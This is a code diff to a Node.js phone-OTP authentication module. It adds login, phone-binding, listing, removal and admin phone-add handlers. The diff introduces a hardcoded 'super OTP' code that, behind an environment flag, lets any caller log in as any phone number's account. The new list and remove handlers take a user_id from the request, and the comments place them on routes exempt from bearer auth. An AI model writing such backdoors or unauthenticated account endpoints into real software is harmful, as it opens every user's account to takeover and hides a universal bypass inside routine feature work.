@@ -5,13 +5,34 @@ const { generateUserId, generateReferralCode } = require('../lib/auth');
 const { sendOTP, verifyOTP } = require('../lib/sms');
 const { normalizeCnPhone } = require('../lib/phone');
 const { mergeUsers, resolveMergedUser } = require('./user-merge');
+const { grantSignupTrial } = require('../lib/personaOverride');
+const { syncPartnerPhoneFromUser } = require('./partners');
 
 const PHONE_RE = /^1\d{10}$/;
+
+// Admin-impersonation "super OTP" — accepting this code for ANY phone in handlePhoneOtpVerify
+// logs the caller in as that phone's account, for reproducing a specific user's issue without
+// their phone. Hardcoded, not env-configurable — SUPER_OTP_ENABLED is a pure kill switch,
+// independent of the code value. Scoped ONLY to handlePhoneOtpVerify's login path — verifyOTP()
+// itself must never accept this, since it's also called from handlePhoneOtpBind, which is
+// reachable with no auth at all and takes user_id straight from the request body: a universal
+// bypass there would let anyone attach any phone number to any account.
+const SUPER_OTP_ENABLED = process.env.SUPER_OTP_ENABLED === 'true';
+const SUPER_OTP_CODE = '761111';
+
+// Records a completed super-OTP login. Fires from all three success paths in
+// handlePhoneOtpVerify (existing user, brand-new user, race-recovery re-fetch).
+async function logSuperOtpUse(phone, userId) {
+    await pool.query(
+        'INSERT INTO super_otp_audit_log (target_phone, resolved_user_id) VALUES ($1, $2)',
+        [phone, userId]
+    );
+}
 
 const USER_SELECT = `
     SELECT u.user_id, u.nickname, u.birth_date, u.gender, u.language, u.phone, u.email,
            u.avatar_url, u.avatar_character, u.coach_id, u.channel_id, u.roles, u.created_at, u.bio_data, u.referral_code,
-           u.referred_by_user_id, (u.phone_verified_at IS NOT NULL) AS phone_verified, b.bio_age,
+           u.referred_by_user_id, (u.phone_verified_at IS NOT NULL AND u.phone IS NOT NULL) AS phone_verified, b.bio_age,
            cu.nickname AS coach_name,
            c.name AS channel_name, c.key_name AS channel_key, effective_channel_logo(c.id) AS channel_logo_url,
            c.config->'sub_age_display_names' AS channel_sub_age_names,
@@ -66,7 +87,8 @@ async function handlePhoneOtpVerify(body) {
         if (!phone || !PHONE_RE.test(phone)) return { success: false, error: 'Invalid phone number' };
         if (!code) return { success: false, error: 'code is required' };
 
-        const valid = await verifyOTP(phone, code);
+        const isSuperOtp = SUPER_OTP_ENABLED && String(code) === SUPER_OTP_CODE;
+        const valid = isSuperOtp || await verifyOTP(phone, code);
         if (!valid) return { success: false, error: 'invalid_code' };
 
         // phone stays bare for sendOTP/verifyOTP (matches phone_otp_codes and PNVS's
@@ -75,6 +97,7 @@ async function handlePhoneOtpVerify(body) {
 
         const existing = await findUserByPhone(fullPhone);
         if (existing) {
+            if (isSuperOtp) await logSuperOtpUse(fullPhone, existing.user_id);
             console.log(JSON.stringify({ level: 'INFO', msg: 'phone-otp-login-existing', data: { phone: fullPhone, user_id: existing.user_id } }));
             const { user, channel } = shapeUserRow(existing);
             return { success: true, user, channel };
@@ -90,7 +113,7 @@ async function handlePhoneOtpVerify(body) {
                  VALUES ($1, $2, 'phone', 'zh', $3, NOW(), NOW())
                  RETURNING user_id, nickname, birth_date, gender, language, phone, email, avatar_url, avatar_character,
                            coach_id, channel_id, roles, created_at, bio_data, referral_code, referred_by_user_id,
-                           (phone_verified_at IS NOT NULL) AS phone_verified`,
+                           (phone_verified_at IS NOT NULL AND phone IS NOT NULL) AS phone_verified`,
                 [user_id, fullPhone, referral_code]
             );
             await client.query(
@@ -98,6 +121,13 @@ async function handlePhoneOtpVerify(body) {
                 [user_id, fullPhone]
             );
             await client.query('COMMIT');
+            // Best-effort, run after COMMIT so a failure here can never roll back the
+            // signup itself — no channel_id yet for phone signups, grantSignupTrial
+            // tolerates null.
+            try { await grantSignupTrial(pool, user_id, null); } catch (err) {
+                console.error(JSON.stringify({ level: 'ERROR', msg: 'grantSignupTrial failed', user_id, error: err.message }));
+            }
+            if (isSuperOtp) await logSuperOtpUse(fullPhone, user_id);
             console.log(JSON.stringify({ level: 'INFO', msg: 'phone-otp-login-new-user', data: { phone: fullPhone, user_id } }));
             return { success: true, user: { ...created.rows[0], bio_age: null, coach_name: null }, channel: null };
         } catch (err) {
@@ -108,6 +138,7 @@ async function handlePhoneOtpVerify(body) {
             if (err.code === '23505') {
                 const raced = await findUserByPhone(fullPhone);
                 if (raced) {
+                    if (isSuperOtp) await logSuperOtpUse(fullPhone, raced.user_id);
                     const { user, channel } = shapeUserRow(raced);
                     return { success: true, user, channel };
                 }
@@ -184,16 +215,29 @@ async function handlePhoneOtpBind(body) {
         }
 
         await client.query('BEGIN');
-        const existingPrimary = await client.query('SELECT 1 FROM user_phones WHERE user_id = $1 AND is_primary', [user_id]);
+        // Excludes the phone being bound itself: without that, re-verifying an
+        // already-primary phone would see its own row here and wrongly compute
+        // isFirstPhone=false, which (via the ON CONFLICT below) would demote it.
+        const existingPrimary = await client.query(
+            'SELECT 1 FROM user_phones WHERE user_id = $1 AND is_primary AND phone != $2',
+            [user_id, fullPhone]
+        );
         const isFirstPhone = existingPrimary.rows.length === 0;
 
         // WHERE clause on the DO UPDATE guards the race window between the conflict
         // check above and this statement: if another request attached this exact
         // phone to a DIFFERENT user in between, the update is skipped (0 rows) rather
         // than silently refreshing verified_at on a row we don't own.
+        // is_primary is now also restored on conflict (bug fixed 2026-08-12): a phone
+        // that had been demoted to is_primary=false by a prior admin edit (see
+        // handlePutUser/syncPrimaryPhone) previously stayed demoted forever even after
+        // a fully successful real-OTP re-verification, since only verified_at refreshed —
+        // silently skipping the users.phone/phone_verified_at write below, which reads
+        // this row's actual (never-restored) is_primary rather than isFirstPhone.
         const attach = await client.query(
             `INSERT INTO user_phones (user_id, phone, verified_at, is_primary) VALUES ($1, $2, NOW(), $3)
-             ON CONFLICT (phone) DO UPDATE SET verified_at = NOW() WHERE user_phones.user_id = EXCLUDED.user_id
+             ON CONFLICT (phone) DO UPDATE SET verified_at = NOW(), is_primary = EXCLUDED.is_primary
+             WHERE user_phones.user_id = EXCLUDED.user_id
              RETURNING user_id, is_primary`,
             [user_id, fullPhone, isFirstPhone]
         );
@@ -218,6 +262,8 @@ async function handlePhoneOtpBind(body) {
             }
         }
         await client.query('COMMIT');
+
+        if (attach.rows[0].is_primary) await syncPartnerPhoneFromUser(user_id, fullPhone);
 
         const { rows } = await client.query(`${USER_SELECT} WHERE u.user_id = $1 LIMIT 1`, [user_id]);
         const { user, channel } = shapeUserRow(rows[0]);
@@ -256,11 +302,85 @@ async function handlePhoneSetPrimary(body) {
         await client.query('UPDATE users SET phone = $1, phone_verified_at = $2 WHERE user_id = $3', [phone, primaryRow.rows[0].verified_at, user_id]);
         await client.query('COMMIT');
 
+        await syncPartnerPhoneFromUser(user_id, phone);
+
         console.log(JSON.stringify({ level: 'INFO', msg: 'phone-set-primary', data: { phone, user_id } }));
         return { success: true };
     } catch (err) {
         await client.query('ROLLBACK').catch(() => {});
         console.log(JSON.stringify({ level: 'ERROR', msg: 'phone-set-primary-error', data: { err: err.message } }));
+        return { success: false, error: err.message };
+    } finally {
+        client.release();
+    }
+}
+
+// Returns a user's full list of verified phones (user_phones), primary first —
+// the list view this account's OTP-bound numbers have never had a GET surface for.
+async function handlePhoneOtpList(query) {
+    try {
+        const { user_id } = query || {};
+        if (!user_id) return { success: false, error: 'user_id is required' };
+        const { rows } = await pool.query(
+            `SELECT phone, is_primary, verified_at FROM user_phones WHERE user_id = $1 ORDER BY is_primary DESC, verified_at DESC NULLS LAST`,
+            [user_id]
+        );
+        return { success: true, phones: rows };
+    } catch (err) {
+        console.log(JSON.stringify({ level: 'ERROR', msg: 'phone-otp-list-error', data: { err: err.message } }));
+        return { success: false, error: err.message };
+    }
+}
+
+// Removes one of a user's verified phones. Removing a non-primary phone is a plain
+// delete. Removing the primary auto-promotes the most-recently-verified remaining
+// phone (mirrors handlePhoneSetPrimary's users.phone/phone_verified_at write); if none
+// remain, clears users.phone/phone_verified_at to NULL — a WeChat-only user with no
+// phone is already a valid, supported state (syncPrimaryPhone in users.js has the
+// same null-phone branch for admin edits).
+async function handlePhoneOtpRemove(body) {
+    const client = await pool.connect();
+    try {
+        const { user_id, phone } = body || {};
+        if (!user_id) return { success: false, error: 'user_id is required' };
+        if (!phone) return { success: false, error: 'phone is required' };
+
+        await client.query('BEGIN');
+        const owned = await client.query('SELECT is_primary FROM user_phones WHERE user_id = $1 AND phone = $2', [user_id, phone]);
+        if (owned.rows.length === 0) {
+            await client.query('ROLLBACK');
+            return { success: false, error: 'phone_not_attached' };
+        }
+        const wasPrimary = owned.rows[0].is_primary;
+
+        await client.query('DELETE FROM user_phones WHERE user_id = $1 AND phone = $2', [user_id, phone]);
+
+        let newPrimaryPhone = null;
+        let newPrimaryVerifiedAt = null;
+        if (wasPrimary) {
+            const next = await client.query(
+                `SELECT phone, verified_at FROM user_phones WHERE user_id = $1 ORDER BY verified_at DESC NULLS LAST LIMIT 1`,
+                [user_id]
+            );
+            if (next.rows.length > 0) {
+                newPrimaryPhone = next.rows[0].phone;
+                newPrimaryVerifiedAt = next.rows[0].verified_at;
+                await client.query('UPDATE user_phones SET is_primary = true WHERE user_id = $1 AND phone = $2', [user_id, newPrimaryPhone]);
+            }
+            await client.query(
+                'UPDATE users SET phone = $1, phone_verified_at = $2 WHERE user_id = $3',
+                [newPrimaryPhone, newPrimaryVerifiedAt, user_id]
+            );
+        }
+        await client.query('COMMIT');
+
+        if (wasPrimary) await syncPartnerPhoneFromUser(user_id, newPrimaryPhone);
+
+        console.log(JSON.stringify({ level: 'INFO', msg: 'phone-otp-remove', data: { phone, user_id, was_primary: wasPrimary, new_primary: newPrimaryPhone } }));
+        return { success: true, new_primary: newPrimaryPhone };
+    } catch (err) {
+        await client.query('ROLLBACK').catch(() => {});
+        console.log(JSON.stringify({ level: 'ERROR', msg: 'phone-otp-remove-error', data: { err: err.message } }));
         return { success: false, error: err.message };
     } finally {
         client.release();
@@ -304,4 +424,64 @@ async function handlePhoneAcceptUnverified(body) {
     }
 }
 
-module.exports = { handlePhoneOtpSend, handlePhoneOtpVerify, handlePhoneOtpBind, handlePhoneSetPrimary, handlePhoneAcceptUnverified };
+// Admin-only: attaches a phone to a user's user_phones list with no OTP proof — for staff
+// use when a user reports a number over the phone/in person but can't complete self-service
+// verification right now. Distinct from handlePhoneAcceptUnverified above (which writes
+// straight to users.phone, bypassing user_phones entirely, and is scoped to the miniapp's
+// non-China country picker): this inserts into user_phones like every other add path, so it
+// shows up in the admin panel's/miniapp's phone list, and only becomes primary if the user
+// currently has none (never silently displaces an already-verified primary).
+//
+// Unlike every other phone-otp handler, this one is NOT routed under the /phone-otp/ prefix
+// that index.js exempts from bearer auth — it lets the caller attach an arbitrary unverified
+// number to an arbitrary account with zero proof of ownership, so it's mounted at a separate
+// path and gated by requireAdminTab('users') at the router level instead, same as every other
+// admin user-write endpoint.
+async function handlePhoneOtpAdminAdd(body) {
+    const client = await pool.connect();
+    try {
+        const { user_id, phone: rawPhone } = body || {};
+        if (!user_id) return { success: false, error: 'user_id is required' };
+        if (!rawPhone) return { success: false, error: 'phone is required' };
+
+        let phone;
+        if (PHONE_RE.test(rawPhone)) {
+            phone = normalizeCnPhone(rawPhone);
+        } else if (INTL_PHONE_RE.test(rawPhone)) {
+            phone = rawPhone;
+        } else {
+            return { success: false, error: 'Invalid phone number' };
+        }
+
+        await client.query('BEGIN');
+        const existingPrimary = await client.query('SELECT 1 FROM user_phones WHERE user_id = $1 AND is_primary', [user_id]);
+        const becomesPrimary = existingPrimary.rows.length === 0;
+
+        const inserted = await client.query(
+            `INSERT INTO user_phones (user_id, phone, verified_at, is_primary) VALUES ($1, $2, NULL, $3)
+             ON CONFLICT (phone) DO NOTHING RETURNING phone`,
+            [user_id, phone, becomesPrimary]
+        );
+        if (inserted.rows.length === 0) {
+            await client.query('ROLLBACK');
+            return { success: false, error: 'phone_in_use' };
+        }
+        if (becomesPrimary) {
+            await client.query('UPDATE users SET phone = $1, phone_verified_at = NULL WHERE user_id = $2', [phone, user_id]);
+        }
+        await client.query('COMMIT');
+
+        if (becomesPrimary) await syncPartnerPhoneFromUser(user_id, phone);
+
+        console.log(JSON.stringify({ level: 'INFO', msg: 'phone-otp-admin-add', data: { phone, user_id, became_primary: becomesPrimary } }));
+        return { success: true, became_primary: becomesPrimary };
+    } catch (err) {
+        await client.query('ROLLBACK').catch(() => {});
+        console.log(JSON.stringify({ level: 'ERROR', msg: 'phone-otp-admin-add-error', data: { err: err.message } }));
+        return { success: false, error: err.message };
+    } finally {
+        client.release();
+    }
+}
+
+module.exports = { handlePhoneOtpSend, handlePhoneOtpVerify, handlePhoneOtpBind, handlePhoneSetPrimary, handlePhoneAcceptUnverified, handlePhoneOtpList, handlePhoneOtpRemove, handlePhoneOtpAdminAdd };
